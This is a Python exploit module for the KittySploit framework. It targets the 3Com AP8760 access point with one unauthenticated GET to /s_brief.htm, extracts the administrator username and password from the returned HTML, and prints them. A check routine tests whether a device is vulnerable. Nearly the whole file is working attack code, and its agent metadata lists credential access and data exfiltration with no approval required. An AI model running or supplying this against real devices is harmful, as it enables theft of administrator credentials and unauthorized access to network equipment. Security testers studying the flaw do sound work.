#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""3Com AP8760 Password Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': '3Com AP8760 Password Disclosure',
        'description': 'Exploits 3Com AP8760 password disclosure vulnerability.If the target is vulnerable it is possible to fetch credentials for administration user.',
        'author': ['Richard Brain', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['http://www.procheckup.com/procheckup-labs/pr07-40/'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        creds = []

        print_status("Sending payload request")
        response = self.http_request(
            method="GET",
            path="/s_brief.htm",
        )

        if response is None:
            return

        print_status("Extracting credentials")
        username = re.findall('<input type="text" name="szUsername" size=16 value="(.+?)">', response.text)
        password = re.findall('<input type="password" name="szPassword" size=16 maxlength="16" value="(.+?)">', response.text)

        if len(username) and len(password):
            print_success("Exploit success")
            creds.append((username[0], password[0]))
            print_table(("Login", "Password"), *creds)
        else:
            print_error("Exploit failed - could not extract credentials")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/s_brief.htm",
        )
        if response is None:
            return False  # target is not vulnerable

        if "szUsername" in response.text and "szPassword" in response.text:
            return True  # target is vulnerable

        return False  # target not vulnerable
